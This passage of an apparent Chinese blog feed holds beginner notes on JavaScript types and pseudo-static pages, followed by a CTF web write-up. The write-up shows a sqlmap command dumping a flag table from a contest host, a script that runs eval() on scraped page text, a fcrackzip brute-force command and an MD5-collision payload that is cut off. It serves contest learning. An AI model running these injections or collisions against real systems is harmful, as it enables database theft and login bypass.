title="基本类型"></a>基本类型</h2><p>数字、字符串、布尔、<code>null</code>、<code>undefined</code>、符号</p><h2 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h2><pre><code class="hljs javascript"><span class="hljs-built_in">Array</span>、<span class="hljs-built_in">Date</span>、<span class="hljs-built_in">RegExp</span>、<span class="hljs-built_in">Map</span>和<span class="hljs-built_in">WeakMap</span>、<span class="hljs-built_in">Set</span>和<span class="hljs-built_in">WeakSet</span></code></pre><h1 id="Javascript识别四种类型数字字面量"><a href="#Javascript识别四种类型数字字面量" class="headerlink" title="Javascript识别四种类型数字字面量"></a>Javascript识别四种类型数字字面量</h1><h2 id="数字"><a href="#数字" class="headerlink" title="数字"></a>数字</h2><p>十进制、二进制、八进制、十六进制</p><pre><code class="hljs stata">Let <span class="hljs-keyword">count</span> = 10;<span class="hljs-keyword">Const</span> blue=0x0000ff;<span class="hljs-keyword">Const</span> imask = 0o0022;<span class="hljs-keyword">Const</span> roomTemp=21.5;<span class="hljs-keyword">Const</span> c =3.0e6;<span class="hljs-keyword">Const</span> <span class="hljs-keyword">e</span> =-1.6e-19;<span class="hljs-keyword">Const</span> <span class="hljs-keyword">inf</span> = Infinity;<span class="hljs-keyword">Const</span> ninf = -Infinity;<span class="hljs-keyword">Const</span> nan = NaN;</code></pre><p>即便count赋值为10，仍然为double型<br><img src="./4.png" srcset="/img/loading.gif" alt=""></p><h1 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h1><ol><li>字符串在<code>javascript</code>中表示<code>Unicode</code>文本。<code>Unicode</code>可以在任何语言中表示文本。</li><li>Js中，单引号、双引号、或者重音符都可以表示字符串字面量。</li></ol><h1 id="特殊字符"><a href="#特殊字符" class="headerlink" title="特殊字符"></a>特殊字符</h1><p><img src="./5.png" srcset="/img/loading.gif" alt=""></p><pre><code class="hljs kotlin"><span class="hljs-string">'use strict'</span>;let currentTemp = <span class="hljs-number">19.5</span>;<span class="hljs-keyword">const</span> message=<span class="hljs-string">"THe current temperature is "</span>+currentTemp+<span class="hljs-string">"\u00b0C"</span>;<span class="hljs-keyword">const</span> me2 = <span class="hljs-string">"\xc9p\xe9e is fun , but foil is more fun"</span>;console.log(message+<span class="hljs-string">"\n"</span>);console.log(me2+<span class="hljs-string">"\n"</span>);🔥 ~/Desktop &gt; node test.jsTHe current temperature <span class="hljs-keyword">is</span> <span class="hljs-number">19.5</span>°CÉpée <span class="hljs-keyword">is</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> , but foil <span class="hljs-keyword">is</span> more <span class="hljs-keyword">fun</span></span></code></pre><h1 id="模板字符串"><a href="#模板字符串" class="headerlink" title="模板字符串"></a>模板字符串</h1><p><code>${xxxxx}</code> 在字符串中形成拼接 类似还有 ‘+’</p><h1 id="数字用作字符串"><a href="#数字用作字符串" class="headerlink" title="数字用作字符串"></a>数字用作字符串</h1><pre><code class="hljs angelscript">Const result1 = <span class="hljs-number">3</span>+ ‘<span class="hljs-number">30</span>’; <span class="hljs-comment">// 330</span>Const result2 = <span class="hljs-number">3</span>*’<span class="hljs-number">30</span>’; <span class="hljs-comment">//90</span></code></pre><p><img src="./6.png" srcset="/img/loading.gif" alt=""></p><h1 id="布尔型"><a href="#布尔型" class="headerlink" title="布尔型"></a>布尔型</h1><pre><code class="hljs ebnf"><span class="hljs-attribute">Let heating</span> = true;<span class="hljs-attribute">Let cooling</span> = false;</code></pre><h1 id="符号"><a href="#符号" class="headerlink" title="符号"></a>符号</h1><p>Symbol()构造方法可以用来创建符号。<code>Symbol()</code>函数会返回symbol类型的值，该类型具有<code>静态属性和静态方法</code></p><p>代表一个唯一标志，符号一经创建就是独一无二的，类似于对象。</p><pre><code class="hljs reasonml">Const RED = <span class="hljs-constructor">Symbol()</span>;Const ORANGE = <span class="hljs-constructor">Symbol(“The <span class="hljs-params">color</span> <span class="hljs-params">of</span> <span class="hljs-params">a</span> <span class="hljs-params">sunset</span>!”)</span>;RED<span class="hljs-operator"> === </span>ORANGE <span class="hljs-comment">// false: 每个符号都是唯一的</span></code></pre><p>NULL和undefined区别<br>NULL表示没有值，undefined表示未被赋值。变量被创建未赋值，默认被定义为undefined。推荐使用NULL</p><h1 id="对象-1"><a href="#对象-1" class="headerlink" title="对象"></a>对象</h1><p>对象语法：大括号<code>{}</code><br>NOTICE：不能使用关键字new创建一个符号<br>DEMO：<br><code>const obj={}; //空对象</code></p><h2 id="对象内容"><a href="#对象内容" class="headerlink" title="对象内容"></a>对象内容</h2><ol><li><p>使用属性</p><pre><code class="hljs mel">obj.<span class="hljs-keyword">size</span>; <span class="hljs-comment">//undefined</span>obj.<span class="hljs-keyword">color</span>; <span class="hljs-comment">//”yellow”</span></code></pre></li><li><p>计算机成员访问符</p><pre><code class="hljs mipsasm">obj[“not <span class="hljs-keyword">and </span>identifier”]=<span class="hljs-number">3</span>;obj[“not <span class="hljs-keyword">and </span>identifier”]<span class="hljs-comment">; // 3</span>obj[“color”]=’yellow’<span class="hljs-comment">; //yellow</span></code></pre></li><li><p>Symbol()</p><pre><code class="hljs abnf">const SIZE = Symbol()<span class="hljs-comment">;</span>obj[SIZE]=<span class="hljs-number">8</span><span class="hljs-comment">;</span>obj[SIZE]<span class="hljs-comment">;</span></code></pre><p>创建对象并初始化属性<br><img src="./7.png" srcset="/img/loading.gif" alt=""></p></li></ol><p>在大括号内部，属性用逗号间隔，属性名和属性值用冒号隔开。</p><pre><code class="hljs lasso">const sam1=&#123;     name: ‘Sam’,     age: <span class="hljs-number">4</span>,&#125; <span class="hljs-comment">// 不同行声明</span>const sam2 = &#123;name:’Sam’,age:<span class="hljs-number">4</span>&#125;; <span class="hljs-comment">//同一行声明</span>const sam3 =&#123;  name: ‘Sam’,  classificatiion: &#123;kingdom: ‘ADN’,<span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>..,&#125;,&#125;; <span class="hljs-comment">//属性值也可是对象</span></code></pre><h2 id="对象添加函数"><a href="#对象添加函数" class="headerlink" title="对象添加函数"></a>对象添加函数</h2><p><code>sam3.speak=function(){return “Meow!”;};</code><br><img src="./8.png" srcset="/img/loading.gif" alt=""></p><h2 id="删除对象"><a href="#删除对象" class="headerlink" title="删除对象"></a>删除对象</h2><pre><code class="hljs actionscript"><span class="hljs-keyword">delete</span> sam3.classification: <span class="hljs-comment">//整个classification树被移除</span><span class="hljs-keyword">delete</span> sam3.speak; <span class="hljs-comment">//</span></code></pre><h2 id="Number-String和Boolean对象"><a href="#Number-String和Boolean对象" class="headerlink" title="Number,String和Boolean对象"></a>Number,String和Boolean对象</h2><p>数字、字符串和布尔型都有对应的对象类型。一是存储特殊值，二是以函数的形式提供某些功能。</p><pre><code class="hljs reasonml">const s = “hello”;s.<span class="hljs-keyword">to</span><span class="hljs-constructor">UpperCase()</span>;   <span class="hljs-comment">//”Hello”</span></code></pre><p>事实上，s是字符串类型，在调用方法或属性临时的创建一个<code>string</code>对象。一旦这个函数被调用了，该临时对象就会被删除。<br><img src="./9.png" srcset="/img/loading.gif" alt=""></p><h1 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h1><ol><li>数组长度不固定，可以随时添加和删除元素u</li><li>数组中元素的类型是多样的，每个元素都可以是任意类型。</li><li>数组下标从0开始</li></ol><h2 id="表示方法"><a href="#表示方法" class="headerlink" title="表示方法"></a>表示方法</h2><pre><code class="hljs angelscript"><span class="hljs-keyword">const</span> a1=[<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>]; <span class="hljs-keyword">const</span> a2=[<span class="hljs-number">1</span>,’two’,<span class="hljs-number">3</span>,NULL];<span class="hljs-keyword">const</span> a3=[&#123;name:”Ruby”,hardness:<span class="hljs-number">9</span>&#125;,&#123;name:”aaaa”,hardness:<span class="hljs-number">91</span>&#125;,];<span class="hljs-keyword">const</span> a4=[[<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>],[<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>],];</code></pre><h2 id="日期"><a href="#日期" class="headerlink" title="日期"></a>日期</h2><p>创建当前时间日期</p><pre><code class="hljs angelscript">&gt; <span class="hljs-keyword">const</span> now= new Date();undefined&gt; now;<span class="hljs-number">2019</span><span class="hljs-number">-04</span><span class="hljs-number">-09</span>T15:<span class="hljs-number">09</span>:<span class="hljs-number">43.892</span>Z</code></pre><h2 id="创建指定日期时间"><a href="#创建指定日期时间" class="headerlink" title="创建指定日期时间"></a>创建指定日期时间</h2><pre><code class="hljs angelscript">&gt; <span class="hljs-keyword">const</span> halloween = new Date(<span class="hljs-number">2016</span>,<span class="hljs-number">9</span>,<span class="hljs-number">31</span>,<span class="hljs-number">19</span>,<span class="hljs-number">0</span>);undefined&gt; halloween;<span class="hljs-number">2016</span><span class="hljs-number">-10</span><span class="hljs-number">-31</span>T11:<span class="hljs-number">00</span>:<span class="hljs-number">00.000</span>Z</code></pre><p>常用方法<br><img src="./10.png" srcset="/img/loading.gif" alt=""></p><h1 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h1><p>JavaScript中正则表达式通过RegExp对象来表达</p><pre><code class="hljs reasonml"><span class="hljs-keyword">let</span> regex = <span class="hljs-keyword">new</span> <span class="hljs-constructor">RegExp(<span class="hljs-string">"ab+c"</span>)</span>;<span class="hljs-keyword">let</span> regex = <span class="hljs-keyword">new</span> <span class="hljs-constructor">RegExp(<span class="hljs-operator">/</span>^[<span class="hljs-params">a</span>-<span class="hljs-params">zA</span>-Z]+[0-9]<span class="hljs-operator">*</span>\W?<span class="hljs-params">_$</span><span class="hljs-operator">/</span>, <span class="hljs-string">"gi"</span>)</span>;<span class="hljs-keyword">let</span> regex = <span class="hljs-keyword">new</span> <span class="hljs-constructor">RegExp(<span class="hljs-string">"^[a-zA-Z]+[0-9]*\\W?_$"</span>, <span class="hljs-string">"gi"</span>)</span>;</code></pre><h1 id="映像和集合"><a href="#映像和集合" class="headerlink" title="映像和集合"></a>映像和集合</h1><p>ES6引进Map和set,以及它们的“弱”引用类型<code>WeakMap</code>和<code>WeakSet</code>。映射也是一种对象，它将键和值关联映射在一起。集合类似于数组，但它不允许重复元素。<br>映射<code>Map</code></p><pre><code class="hljs arduino">var <span class="hljs-built_in">map</span> = <span class="hljs-keyword">new</span> Map(); <span class="hljs-comment">//映射，不重复的键，以键值对的形式存在 </span><span class="hljs-built_in">map</span>.<span class="hljs-built_in">set</span>(<span class="hljs-string">"name"</span>,<span class="hljs-string">"mapluanpeng"</span>); <span class="hljs-comment">//添加设置映射 </span><span class="hljs-keyword">if</span>(<span class="hljs-built_in">map</span>.has(<span class="hljs-string">"name"</span>)) <span class="hljs-comment">//判断映射是否存在 </span><span class="hljs-built_in">printf</span>(<span class="hljs-built_in">map</span>.<span class="hljs-built_in">get</span>(<span class="hljs-string">"name"</span>)); <span class="hljs-comment">//读取映射 </span><span class="hljs-built_in">map</span>.<span class="hljs-keyword">delete</span>(<span class="hljs-string">"name"</span>); <span class="hljs-comment">//删除映射</span></code></pre><h1 id="集合Set"><a href="#集合Set" class="headerlink" title="集合Set"></a>集合Set</h1><pre><code class="hljs reasonml">var set1 = <span class="hljs-keyword">new</span> <span class="hljs-constructor">Set([<span class="hljs-string">"name1"</span>,<span class="hljs-string">"name2"</span>,<span class="hljs-string">"name3"</span>])</span>; <span class="hljs-comment">//集合。不重复的元素集合，不存在键值对 </span>set1.add(<span class="hljs-string">"name"</span>); <span class="hljs-comment">//添加集合 </span><span class="hljs-keyword">if</span>(set1.has(<span class="hljs-string">"name"</span>))&#123; <span class="hljs-comment">//检测集合是否存在指定元素 </span>set1.delete(<span class="hljs-string">"name"</span>); <span class="hljs-comment">//删除集合元素 </span>set1.clear<span class="hljs-literal">()</span>; <span class="hljs-comment">//清空集合元素 </span>console.log(set1.size); <span class="hljs-comment">//集合大小 &#125;</span>set1 = <span class="hljs-keyword">new</span> <span class="hljs-constructor">Set([<span class="hljs-string">"name1"</span>,<span class="hljs-string">"name2"</span>,<span class="hljs-string">"name3"</span>])</span>; var set2 = <span class="hljs-keyword">new</span> <span class="hljs-constructor">Set([<span class="hljs-string">"name1"</span>,<span class="hljs-string">"name3"</span>,<span class="hljs-string">"name5"</span>])</span>; <span class="hljs-comment">//并集 </span><span class="hljs-keyword">let</span> union = <span class="hljs-keyword">new</span> <span class="hljs-constructor">Set([<span class="hljs-operator">...</span><span class="hljs-params">set1</span>, <span class="hljs-operator">...</span><span class="hljs-params">set2</span>])</span>; <span class="hljs-comment">//交集 </span><span class="hljs-keyword">let</span> intersect = <span class="hljs-keyword">new</span> <span class="hljs-constructor">Set([<span class="hljs-operator">...</span><span class="hljs-params">set1</span>].<span class="hljs-params">filter</span>( <span class="hljs-params">x</span> =&gt; <span class="hljs-params">set2</span>.<span class="hljs-params">has</span>(<span class="hljs-params">x</span>)</span>)); <span class="hljs-comment">//差集 </span><span class="hljs-keyword">let</span> difference = <span class="hljs-keyword">new</span> <span class="hljs-constructor">Set([<span class="hljs-operator">...</span><span class="hljs-params">set1</span>].<span class="hljs-params">filter</span>(<span class="hljs-params">x</span> =&gt; !<span class="hljs-params">set2</span>.<span class="hljs-params">has</span>(<span class="hljs-params">x</span>)</span>));</code></pre><h1 id="数据类型转换"><a href="#数据类型转换" class="headerlink" title="数据类型转换"></a>数据类型转换</h1><h2 id="字符串转数值"><a href="#字符串转数值" class="headerlink" title="字符串转数值"></a>字符串转数值</h2><p>第一种使用Number对象的构造方法：</p><pre><code class="hljs angelscript"><span class="hljs-keyword">const</span> numStr=”<span class="hljs-number">33.3</span>”;<span class="hljs-keyword">const</span> num = Number(numStr);<span class="hljs-comment">//如果子丰富传内容不符合数字格式，返回NaN</span></code></pre><p><img src="./11.png" srcset="/img/loading.gif" alt=""></p><p>第二种方式使用内置函数parseInt和parseFloat<br>与Number不同，parseInt可以自己指定要转换成什么格式</p><pre><code class="hljs javascript">&gt; <span class="hljs-keyword">const</span> a = <span class="hljs-built_in">parseInt</span>(<span class="hljs-string">"16 volts"</span>,<span class="hljs-number">10</span>);<span class="hljs-literal">undefined</span>&gt; <span class="hljs-keyword">const</span> b = <span class="hljs-built_in">parseInt</span>(<span class="hljs-string">"3a"</span>,<span class="hljs-number">16</span>);<span class="hljs-literal">undefined</span>&gt; <span class="hljs-keyword">const</span> c = <span class="hljs-built_in">parseFloat</span>(<span class="hljs-string">"15.5 kph"</span>);<span class="hljs-literal">undefined</span>&gt; <span class="hljs-built_in">console</span>.log(a);<span class="hljs-number">16</span><span class="hljs-literal">undefined</span>&gt; <span class="hljs-built_in">console</span>.log(b);<span class="hljs-number">58</span><span class="hljs-literal">undefined</span>&gt; <span class="hljs-built_in">console</span>.log(c);<span class="hljs-number">15.5</span><span class="hljs-literal">undefined</span></code></pre><h2 id="转换成字符串"><a href="#转换成字符串" class="headerlink" title="转换成字符串"></a>转换成字符串</h2><pre><code class="hljs nix">const <span class="hljs-attr">n</span> =<span class="hljs-number">33.5</span>;cosnt <span class="hljs-attr">s</span> =n.<span class="hljs-built_in">toString</span>();</code></pre><h2 id="转换成布尔型"><a href="#转换成布尔型" class="headerlink" title="转换成布尔型"></a>转换成布尔型</h2><pre><code class="hljs angelscript"><span class="hljs-keyword">const</span> n =<span class="hljs-number">0</span>;<span class="hljs-keyword">const</span> b1=!!n;<span class="hljs-keyword">const</span> b2 = Boolean(n);</code></pre><h1 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h1><ol><li>js有6中基本类型，字符串、数字、布尔、null、undefined,以及符号。</li><li>所有数字都是双精度浮点型</li><li>数组是特殊对象类型</li><li>日期、映射、集合和正则表达式都是特殊类型的对象。</li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>基础笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>伪静态页面学习笔记</title>
    <link href="/2019/04/10/%E4%BC%AA%E9%9D%99%E6%80%81%E9%A1%B5%E9%9D%A2%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/2019/04/10/%E4%BC%AA%E9%9D%99%E6%80%81%E9%A1%B5%E9%9D%A2%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="动态页面特征"><a href="#动态页面特征" class="headerlink" title="动态页面特征"></a>动态页面特征</h1><blockquote><ol><li>动态页面是以ASP、PHP、JSP、ASP.net….编写</li><li>只有当用户请求时服务器才返回一个完整的网页</li><li>动态页面上的内容存在于数据库中，根据用户发出的不同请求，为其提供个性化的网页内容</li><li>由于数据库，降低 网站维护的工作量</li><li>采用动态网页技术的网站可以实现更多的功能，如用户注册、用户登录、在线调查、用户管理、订单管理等等； 静态页面 则无法实现这些功能。</li></ol></blockquote><h1 id="SEO角度看动态页面弊端"><a href="#SEO角度看动态页面弊端" class="headerlink" title="SEO角度看动态页面弊端"></a>SEO角度看动态页面弊端</h1><blockquote><ol><li>由于动态页面生成是采用数据库内容，所以网页内容主题的永恒性不能保证。造成搜索引擎阅读困那，即搜索引擎爬取困难。</li><li>动态页面往往带有需要？..参数，使得搜索引起判断识别造成困难</li><li>动态链接，存在信任问题，用户以及搜索引擎无法确定这个页面是否会一直存在</li></ol></blockquote><h1 id="静态页面"><a href="#静态页面" class="headerlink" title="静态页面"></a>静态页面</h1><p>不依托数据库，单纯加载纯正的html页面。但是如果有一万条帖子，就要存储一万条信息。会使得服务器空间造成浪费。</p><h1 id="伪静态页面"><a href="#伪静态页面" class="headerlink" title="伪静态页面"></a>伪静态页面</h1><p>如：文章的连接如<code>/blog/articleInfo.do?userName=zy&amp;&amp;blogId=1&amp;&amp;articleId=1</code>转换成<code>blog/a/0101002526B90C548A833416.html</code>。浏览器访问伪静态页面时是通过正则判断，而这个分辨的过程由 cpu 完成，导致 cpu 使用率上升出现超负荷，影响网站的正常服务就是伪静态的最大弊病。</p><h1 id="动态url转换伪静态"><a href="#动态url转换伪静态" class="headerlink" title="动态url转换伪静态"></a>动态url转换伪静态</h1><ol><li><p>代码编写，使得<code>/blog/articleInfo.do?userName=zy&amp;&amp;blogId=1&amp;&amp;articleId=</code>1转换成<code>blog/a/0101002526B90C548A833416.html</code></p></li><li><p>Apache启用<code>mod_rewrite</code>模块,重新映射地址.<code>http://www.github.io/question/123</code>，Web服务器收到请求后会重新映射为<code>www.github.io/question.php?n=1231</code>，然后再执行那个PHP程序。</p></li></ol><h1 id="判断网页使用是伪静态还是动态页面"><a href="#判断网页使用是伪静态还是动态页面" class="headerlink" title="判断网页使用是伪静态还是动态页面"></a>判断网页使用是伪静态还是动态页面</h1><ol><li><p>IE浏览器JS判断法<br>用IE浏览器需要判断的页面，在地址栏里输入多次访问<code>“javascript：alert(document.lastModified)</code>”，按回车键，就会出现记录时间的小弹窗。比较弹窗的时间，如果都是一样的，那就是静态网页，否则就是伪静态（动态网页）。</p></li><li><p>其他浏览器（Chrome、Firefox）调试器判断法<br>用浏览器（以Chrome为例）打开一个网页，等待网页完全打开之后，开启浏览器控制台：”开发者工具”-“错误控制台”，快捷键：<code>shift+ctrl+J</code> ，然后在控制台里面输入：<code>alert(document.lastModified);</code> ，按回车键后查看最后修改时间并记录<br>多次刷新网页，用同样的方法，比较弹窗的时间，如果都是一样的，那就是静态网页，否则就是伪静态（动态网页）</p></li></ol><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://zy116494718.iteye.com/blog/1685127" target="_blank" rel="noopener">静态页面，伪静态页面、动态的区别</a><br><a href="http://www.lseventt.com/archives/1713.html" target="_blank" rel="noopener">如何判断网页使用的是伪静态还是动态页面？</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>基础笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTF | 嘉伟斯杯_web_wp</title>
    <link href="/2019/04/09/CTF-%E5%98%89%E4%BC%9F%E6%96%AF%E6%9D%AF-web-wp/"/>
    <url>/2019/04/09/CTF-%E5%98%89%E4%BC%9F%E6%96%AF%E6%9D%AF-web-wp/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这个比赛还是很简单，但是只会搞web题目。比赛里也暴露很多问题，</p><h1 id="0x01-土肥原贤二"><a href="#0x01-土肥原贤二" class="headerlink" title="0x01 土肥原贤二"></a>0x01 土肥原贤二</h1><p><code>http://47.103.43.235:81/quest/web/a/index.php</code></p><p>直接使用<code>sqlmap</code>注入<br><code>sqlmap -u &quot;http://47.103.43.235:81/quest/web/a/index.php?gid=1*&quot; -D luozhen -T flag --dump</code></p><p><code>Flag{20_welcome_19}</code></p><p><img src="./1.png" srcset="/img/loading.gif" alt=""></p><h1 id="0x02-吴佩孚"><a href="#0x02-吴佩孚" class="headerlink" title="0x02 吴佩孚"></a>0x02 吴佩孚</h1><p>题目提示js， 将base64解码发送到控制器中运行</p><p><code>flag{sdf465454dfgert32}</code><br><img src="./2.png" srcset="/img/loading.gif" alt=""></p><h1 id="0x03-死亡真相"><a href="#0x03-死亡真相" class="headerlink" title="0x03 死亡真相"></a>0x03 死亡真相</h1><p>Flag{hsd132456}</p><p><img src="./3.png" srcset="/img/loading.gif" alt=""></p><p>猜测为md5 32位<br>右键打开<code>wav</code>属性，看到了<code>zero</code>，想到缺的三个是0，补齐以后解密：<br>hsd132456</p><p><img src="./4.png" srcset="/img/loading.gif" alt=""></p><h1 id="0x06-戴星炳"><a href="#0x06-戴星炳" class="headerlink" title="0x06 戴星炳"></a>0x06 戴星炳</h1><p>题目要求快速算出给出的式子</p><pre><code class="hljs xl"><span class="hljs-keyword">import</span> requests,refrom bs4 <span class="hljs-keyword">import</span> BeautifulSoups = requests.Session()url = <span class="hljs-string">"http://47.103.43.235:82/web/a/index.php"</span>r = s.get(url)soup = BeautifulSoup(r.<span class="hljs-keyword">text</span>,<span class="hljs-string">'lxml'</span>)a = re.findall(<span class="hljs-string">'&lt;p&gt;(.*)&lt;/p&gt;'</span>,str(soup.find_all(<span class="hljs-string">'p'</span>)[<span class="hljs-number">1</span>]))[<span class="hljs-number">0</span>]result = eval(a)<span class="hljs-keyword">data</span> = &#123;    <span class="hljs-string">'result'</span>:result    &#125;r1 = s.post(url,<span class="hljs-keyword">data</span>=<span class="hljs-keyword">data</span>)print(r1.<span class="hljs-keyword">text</span>)</code></pre><p>flag{Y0U_4R3_3o_F4ST!}</p><h1 id="0x07-大美晚报"><a href="#0x07-大美晚报" class="headerlink" title="0x07 大美晚报"></a>0x07 大美晚报</h1><p>另存图片到桌面，<br>使用foremost分离出<code>png</code>,和<code>zip</code>文件<br>使用<code>fcrackzip -v -b -c &#39;1&#39; -l 9 -u 00000011.zip</code>爆破密码<br><img src="./5.png" srcset="/img/loading.gif" alt=""><br><code>flag{d6@YX$_m^aa0}</code></p><h1 id="0x11晴气庆胤"><a href="#0x11晴气庆胤" class="headerlink" title="0x11晴气庆胤"></a>0x11晴气庆胤</h1><p>考察md5碰撞<br>参考文章：<a href="https://xz.aliyun.com/t/2232" target="_blank" rel="noopener">https://xz.aliyun.com/t/2232</a><br>使用软件得到两个txt文件</p><p><img src="./6.png" srcset="/img/loading.gif" alt=""><br>得到两个不同的字符串但md5值相同</p><pre><code class="hljs gcode">pocpara<span class="hljs-name">m1</span>=<span class="hljs-number">1</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">232</span><span class="hljs-meta">%</span><span class="hljs-number">9</span>C<span class="hljs-meta">%</span><span class="hljs-number">21</span><span class="hljs-meta">%</span>F<span class="hljs-number">4</span><span class="hljs-meta">%</span>A<span class="hljs-number">6</span><span class="hljs-meta">%</span><span class="hljs-number">17</span><span class="hljs-meta">%</span>AA<span class="hljs-meta">%</span>CF<span class="hljs-meta">%</span>BF<span class="hljs-meta">%</span><span class="hljs-number">90</span><span class="hljs-meta">%</span>A<span class="hljs-number">8</span><span class="hljs-meta">%</span><span class="hljs-number">08</span><span class="hljs-meta">%</span><span class="hljs-number">0</span>C<span class="hljs-meta">%</span>B<span class="hljs-number">0</span><span class="hljs-meta">%</span><span class="hljs-number">0</span>Al<span class="hljs-meta">%</span><span class="hljs-number">15</span>O<span class="hljs-meta">%</span><span class="hljs-number">3</span>E<span class="hljs-meta">%</span><span class="hljs-number">9</span>C<span class="hljs-meta">%</span><span class="hljs-number">1</span>CS<span class="hljs-meta">%</span><span class="hljs-number">09</span><span class="hljs-meta">%</span><span class="hljs-number">2</span>F<span class="hljs-meta">%</span>BAx<span class="hljs-meta">%</span>C<span class="hljs-number">6</span>J<span class="hljs-meta">%</span>FA<span class="hljs-meta">%</span><span class="hljs-number">95</span><span class="hljs-meta">%</span>EF<span class="hljs-meta">%</span>F<span class="hljs-number">9</span><span class="hljs-meta">%</span><span class="hljs-number">02</span><span class="hljs-meta">%</span>CC<span class="hljs-meta">%</span>E<span class="hljs-number">3</span><span class="hljs-meta">%</span>BE<span class="hljs-meta">%</span>AF<span class="hljs-meta">%</span><span class="hljs-number">3</span>A<span class="hljs-meta">%</span>CB<span class="hljs-meta">%</span><span class="hljs-number">0</span>B<span class="hljs-meta">%</span><span class="hljs-number">24</span>p<span class="hljs-meta">%</span><span class="hljs-number">23</span><span class="hljs-meta">%</span><span class="hljs-number">0</span>A<span class="hljs-meta">%</span>E<span class="hljs-number">8</span><span class="hljs-meta">%</span><span class="hljs-number">25</span><span class="hljs-meta">%</span><span class="hljs-number">10</span>H<span class="hljs-meta">%</span>E<span class="hljs-number">4</span><span class="hljs-meta">%</span><span class="hljs-number">9</span>C<span class="hljs-meta">%</span><span class="hljs-number">29</span><span class="hljs-meta">%</span><span class="hljs-number">0</span>E<span class="hljs-meta">%</span><span class="hljs-number">11</span><span class="hljs-meta">%</span><span class="hljs-number">8</span>F<span class="hljs-meta">%</span>BB<span class="hljs-meta">%</span><span class="hljs-number">0</span>CJ<span class="hljs-meta">%</span>AEW<span class="hljs-meta">%</span>B<span class="hljs-number">9</span><span class="hljs-meta">%</span>BE<span class="hljs-meta">%</span>C<span class="hljs-number">3</span><span class="hljs-meta">%</span><span class="hljs-number">87</span><span class="hljs-meta">%</span>E<span class="hljs-number">6</span>g<span 